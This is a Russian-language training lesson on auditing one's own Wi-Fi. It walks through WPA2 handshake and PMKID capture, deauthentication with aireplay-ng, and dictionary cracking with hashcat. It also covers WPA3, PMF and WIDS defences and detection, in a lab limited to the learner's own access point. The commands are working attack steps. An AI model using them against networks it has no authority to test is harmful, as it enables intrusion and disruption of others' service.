# 18.1 — Wi-Fi: handshake, PMKID, deauth

> **M18 · Этап 3 · 6 ч · 🟡 · артефакт:** `labs/m18-hardware-rf-ot/l01-wifi/`

## Цель

Провести аудит собственной Wi-Fi-сети: захватить handshake/PMKID, оценить стойкость пароля и понять, как это детектится.

## Результат

- Захваченный handshake/PMKID своей сети.
- Проверка пароля по словарю.
- Отчёт с рекомендациями (WPA3, длина пароля, PMF).

## Теория

### 1. Режимы

- **Managed** — обычный клиент.
- **Monitor** — приём всех кадров.
- **Injection** — инъекция (зависит от адаптера/драйвера).

Проверка:

```bash
iw dev
sudo airmon-ng start wlan0
iw dev wlan0mon info
```

### 2. WPA2 handshake

4-way handshake содержит материал для проверки пароля офлайн. Нужно поймать кадры EAPOL.

```bash
sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

Deauth — только в своей сети. В чужой это атака.

### 3. PMKID

Некоторые точки отдают PMKID в первом EAPOL-кадре; можно получить без клиента:

```bash
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o hash.hc22000 pmkid.pcapng
```

### 4. Взлом

```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

Ожидаемо: пароль, если он в словаре.

### 5. Защита

- WPA3-SAE (защита от offline-перебора).
- Длинный пароль (20+ символов) или случайный.
- PMF (802.11w) против deauth.
- Отключить WPS.
- Мониторинг deauth/rogue AP.

### 6. Детект

- Deauth-флуд (802.11 management frames).
- Rogue AP с тем же SSID.
- Аномальные probe requests.
- WIDS/WIPS.

## Лаборатория

> Собственная точка доступа (роутер/телефон) и собственный адаптер. Никаких соседских сетей.

### 1. Подготовка

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

Ожидаемо: список сетей. Найдите свою по BSSID.

### 2. Захват

```bash
sudo airodump-ng -c <channel> --bssid <your-bssid> -w lab wlan0mon
# в другом терминале подключите свой телефон к сети
```

Ожидаемо: `WPA handshake` в выводе.

### 3. PMKID

```bash
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o hash.hc22000 pmkid.pcapng
```

Ожидаемо: хэш.

### 4. Взлом

```bash
hashcat -m 22000 hash.hc22000 rockyou.txt
```

Ожидаемо: пароль или «exhausted». Зафиксируйте время.

### 5. Deauth (в своей сети)

```bash
sudo aireplay-ng --deauth 3 -a <your-bssid> wlan0mon
```

Ожидаемо: клиент переподключается, handshake ловится быстрее.

### 6. Отчёт

Опишите: сеть, защита, время взлома, рекомендации.

## Атака и защита

- **Атака:** handshake/PMKID → offline.
- **Детект:** deauth, rogue AP, WIDS.
- **Фикс:** WPA3, длинный пароль, PMF, WPS off, мониторинг.

## Самопроверка

- [ ] Почему WPA3 усложняет offline-перебор?
- [ ] Что такое PMKID?
- [ ] Зачем PMF?
- [ ] Почему deauth в чужой сети — преступление?
- [ ] Как WIDS видит rogue AP?

## Дальше

[18.2 — SDR](l02-sdr.md)
